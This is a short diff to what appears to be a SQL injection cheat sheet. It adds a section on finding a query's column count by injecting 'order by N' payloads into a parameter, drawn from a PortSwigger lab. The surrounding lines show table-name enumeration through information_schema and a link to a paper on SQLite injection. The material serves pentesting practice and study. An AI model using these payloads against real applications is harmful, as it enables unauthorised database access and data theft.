@@ -650,6 +650,14 @@ Changing to different table names using OFFSET instead of WHERE. Thanks to @iiLe
 SELECT CONCAT(TABLE_NAME) FROM information_schema.tables LIMIT 1 OFFSET 1
 ```
 
+### SQLi determine how many columns (Example taken from portswigger lab)
+
+```
+param=x' order by 1
+param=x' order by 2
+etc, until you receive an error.
+```
+
 ### sqli on sqlite
 https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf
 
